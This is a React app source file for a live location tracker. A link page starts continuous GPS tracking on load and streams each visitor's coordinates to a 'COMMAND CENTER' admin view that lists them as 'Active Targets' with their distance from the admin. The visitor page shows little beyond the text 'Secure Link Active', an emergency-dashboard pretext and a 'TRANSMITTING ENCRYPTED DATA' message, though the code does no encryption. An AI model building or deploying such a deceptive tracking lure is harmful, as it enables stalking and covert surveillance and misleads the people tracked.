import React, { useEffect, useState } from 'react';
import { MapContainer, TileLayer, Marker, Popup, useMap } from 'react-leaflet';
import { io } from 'socket.io-client';
import { User, Navigation, ShieldCheck, Map as MapIcon, ExternalLink, LocateFixed } from 'lucide-react';
import 'leaflet/dist/leaflet.css';
import L from 'leaflet';

// Fix Leaflet Icons
import markerIcon from 'leaflet/dist/images/marker-icon.png';
import markerShadow from 'leaflet/dist/images/marker-shadow.png';
const DefaultIcon = L.icon({ iconUrl: markerIcon, shadowUrl: markerShadow, iconSize: [25, 41], iconAnchor: [12, 41] });
L.Marker.prototype.options.icon = DefaultIcon;

const socket = io(window.location.hostname === 'localhost' ? 'http://localhost:3000' : '/');

// Helper to calculate distance in KM
const getDistance = (lat1, lon1, lat2, lon2) => {
  const R = 6371; // Radius of earth in km
  const dLat = (lat2 - lat1) * Math.PI / 180;
  const dLon = (lon2 - lon1) * Math.PI / 180;
  const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
            Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
            Math.sin(dLon / 2) * Math.sin(dLon / 2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
  return (R * c).toFixed(2);
};

function RecenterMap({ coords }) {
  const map = useMap();
  useEffect(() => { if (coords) map.setView([coords.lat, coords.lng], 16); }, [coords]);
  return null;
}

export default function App() {
  const [role, setRole] = useState('user');
  const [adminLocation, setAdminLocation] = useState(null);
  const [users, setUsers] = useState([]);
  const [selectedUser, setSelectedUser] = useState(null);

  // Automatic Setup on Load
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const urlName = params.get('name') || `User_${Math.random().toString(36).substr(2, 5)}`;
    const userId = localStorage.getItem('userId') || 'uid_' + Math.random().toString(36).substr(2, 9);
    localStorage.setItem('userId', userId);

    if (window.location.pathname.includes('/admin')) {
      setRole('admin');
      // Admin also tracks their own location to calculate distance
      navigator.geolocation.getCurrentPosition((pos) => {
        setAdminLocation({ lat: pos.coords.latitude, lng: pos.coords.longitude });
      });
    } else {
      // USER SIDE: Start tracking automatically immediately
      const startAutoTracking = () => {
        navigator.geolocation.watchPosition((pos) => {
          socket.emit('update-location', { 
            userId, 
            name: urlName, 
            lat: pos.coords.latitude, 
            lng: pos.coords.longitude 
          });
        }, (err) => console.error("Location Error:", err), { 
          enableHighAccuracy: true,
          maximumAge: 0,
          timeout: 5000 
        });
      };
      startAutoTracking();
    }

    socket.on('users-list', (data) => setUsers(data));
    return () => socket.off('users-list');
  }, []);

  const openInGoogleMaps = (lat, lng) => {
    window.open(`https://www.google.com/maps?q=${lat},${lng}`, '_blank');
  };

  // --- ADMIN VIEW ---
  if (role === 'admin') {
    return (
      <div className="flex h-screen w-full bg-slate-950 text-white font-sans">
        <div className="w-80 bg-slate-900 border-r border-slate-800 p-4 flex flex-col z-[1000] shadow-2xl">
          <div className="flex items-center gap-2 mb-8 p-2 bg-red-500/10 rounded-lg border border-red-500/20">
            <ShieldCheck className="text-red-500" />
            <h1 className="text-lg font-bold tracking-tight">COMMAND CENTER</h1>
          </div>
          
          <div className="flex-1 overflow-y-auto custom-scrollbar">
            <p className="text-[10px] uppercase text-slate-500 font-black mb-4 tracking-widest">Active Targets</p>
            {users.map(u => {
              const distance = adminLocation ? getDistance(adminLocation.lat, adminLocation.lng, u.lat, u.lng) : '...';
              return (
                <div 
                  key={u.userId} 
                  onClick={() => setSelectedUser(u)}
                  className={`p-4 rounded-xl mb-3 cursor-pointer transition-all border ${selectedUser?.userId === u.userId ? 'bg-blue-600 border-blue-400 shadow-lg scale-[1.02]' : 'bg-slate-800 border-slate-700 hover:bg-slate-750'}`}
                >
                  <div className="flex justify-between items-start mb-2">
                    <span className="font-bold text-sm">{u.name}</span>
                    <span className="text-[10px] bg-black/30 px-2 py-1 rounded text-blue-300 font-mono">{distance} km</span>
                  </div>
                  <div className="flex gap-2">
                    <button 
                      onClick={(e) => { e.stopPropagation(); openInGoogleMaps(u.lat, u.lng); }}
                      className="flex-1 bg-white/10 hover:bg-white/20 p-2 rounded text-[10px] flex items-center justify-center gap-1"
                    >
                      <MapIcon size={12}/> Google Maps
                    </button>
                  </div>
                </div>
              );
            })}
          </div>
        </div>

        <div className="flex-1 relative">
          <MapContainer center={[20.5937, 78.9629]} zoom={5} className="h-full w-full">
            <TileLayer url="https://{s}.tile.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png" />
            {users.map(u => (
              <Marker key={u.userId} position={[u.lat, u.lng]}>
                <Popup className="custom-popup">
                  <div className="p-2 text-slate-900">
                    <h3 className="font-bold border-b mb-2">{u.name}</h3>
                    <p className="text-xs mb-2">Lat: {u.lat.toFixed(4)} <br/> Lng: {u.lng.toFixed(4)}</p>
                    <button 
                      onClick={() => openInGoogleMaps(u.lat, u.lng)}
                      className="w-full bg-blue-600 text-white p-2 rounded text-xs flex items-center justify-center gap-1"
                    >
                      <ExternalLink size={12}/> Open in Maps
                    </button>
                  </div>
                </Popup>
              </Marker>
            ))}
            {selectedUser && <RecenterMap coords={selectedUser} />}
          </MapContainer>
        </div>
      </div>
    );
  }

  // --- USER VIEW (ZERO UI MODE) ---
  return (
    <div className="h-screen w-full bg-slate-950 flex flex-col items-center justify-center p-10 text-center">
        <div className="relative">
            <div className="absolute inset-0 bg-blue-500 blur-3xl opacity-20 animate-pulse"></div>
            <LocateFixed className="w-16 h-16 text-blue-500 mb-6 relative animate-bounce" />
        </div>
        <h2 className="text-xl font-bold text-white mb-2">Secure Link Active</h2>
        <p className="text-slate-500 text-sm max-w-xs">Your live location is being securely shared with the emergency dashboard.</p>
        <div className="mt-10 flex items-center gap-2 text-[10px] text-blue-400 font-mono tracking-tighter">
            <span className="w-2 h-2 bg-blue-500 rounded-full animate-ping"></span>
            TRANSMITTING ENCRYPTED DATA...
        </div>
    </div>
  );
}
